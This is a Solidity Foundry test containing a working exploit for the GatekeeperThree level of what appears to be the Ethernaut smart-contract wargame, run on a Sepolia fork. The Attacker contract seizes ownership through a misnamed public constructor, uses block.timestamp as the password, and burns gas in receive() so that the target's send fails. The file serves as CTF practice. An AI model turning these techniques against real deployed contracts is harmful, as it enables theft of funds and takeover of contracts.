// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

interface SimpleTrick {

}

interface GatekeeperThree {
    function owner() external view returns (address);
    function entrant() external view returns (address);
    function allowEntrance() external view returns (bool);
    function trick() external view returns (address);

    function construct0r() external;
    function createTrick() external;
    function getAllowance(uint _password) external;
    function enter() external;

}

contract Attacker{
    GatekeeperThree keeper;

    receive() external payable{
        // just to consume some gas to make the `.send` fail
        for (uint i=0; i<100; i++){
            gasleft();
        }
    }

    constructor(GatekeeperThree _gatekeeperThree){
        keeper = _gatekeeperThree;
    }

    function attack() external{
        uint password = block.timestamp;
        keeper.construct0r();
        keeper.createTrick();
        keeper.getAllowance(password);
        keeper.enter();
    }
}

contract GatekeeperThreeTest is Test {
    address instance = 0xc94118098E8E65E2AE5B0126C0B42742e1001Da8;
    function setUp() public{
        vm.createSelectFork("sepolia", 5509515);
    }
    function test_gatekeeperthree() public{
        address player = 0x8AC4E3906688EfE71818531a9e439A7ABFDA0154;
        vm.startPrank(player, player);

        GatekeeperThree keeper = GatekeeperThree(instance);
        console.log("owner %s", keeper.owner());

        payable(address(keeper)).transfer(0.00100000000000001 ether);

        console.log("keeper balance %s", address(keeper).balance);

        console.log("trick %s", keeper.trick());

        Attacker attacker = new Attacker(keeper);
        attacker.attack();


        require(keeper.entrant() == player, "Passthrough gate failed");

    }
}
